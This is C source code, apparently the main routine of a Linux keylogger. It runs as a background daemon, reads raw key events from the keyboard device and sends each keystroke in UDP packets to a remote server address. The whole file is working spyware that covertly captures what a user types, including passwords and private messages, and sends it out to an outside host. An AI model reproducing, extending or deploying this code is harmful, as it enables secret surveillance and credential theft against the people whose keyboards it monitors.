#include <stdio.h>
#include <string.h>        /* strerror() */
#include <errno.h>         /* errno */
#include <fcntl.h>         /* open() */
#include <unistd.h>        /* close() */
#include <sys/ioctl.h>     /* ioctl() */
#include <linux/input.h>   /* EVIOCGVERSION ++ */

#include "keylogger.h"
#include "keyboard.h"
#include "udp_client.h"
#include "key_util.h"
#include "daemon.h"

#define EV_BUF_SIZE 16

int main(int argc, char *argv[])
{
    daemonise();
    int fd_device;
    fd_device = get_keyboard_fd();

    client *c = init_client(SERVER_PORT, SERVER_ADDR);

    #ifdef DEBUG
    get_device_infos(fd_device);
    #endif

    struct input_event ev[EV_BUF_SIZE]; /* Read up to EV_BUF_SIZE events ata time */
    __u_char shift_register;
    shift_register = 0;

    /* Loop. Read event file and parse result. */
    for (;;) {

        int sz = read(fd_device, ev, sizeof(struct input_event) * EV_BUF_SIZE);
        if (sz < (int) sizeof(struct input_event)) {
            fprintf(stderr,
                "ERR %d:\n"
                "Reading of `%s' failed\n"
                "%s\n",
                errno, argv[1], strerror(errno)
            );
            goto fine;
        }

        for (int i = 0; i < sz / sizeof(struct input_event); ++i) {
            char packet[256];
            size_t packet_size;

            if (ev[i].type == EV_KEY) {
                if (!is_shift_key(ev[i].code) &&
                    (ev[i].value == 1 || ev[i].value == 2)) {

                        if ((packet_size = build_packet(ev[i], packet) > 0)) {
                            send_packet(c, (void *)packet);
                        }
                }
                if (is_shift_key(ev[i].code)) {
                        update_shift_register(ev[i].value, shift_register);                        
                }
            }
        }
    }

fine:
    close_client(c);
    close(fd_device);
    return errno;
}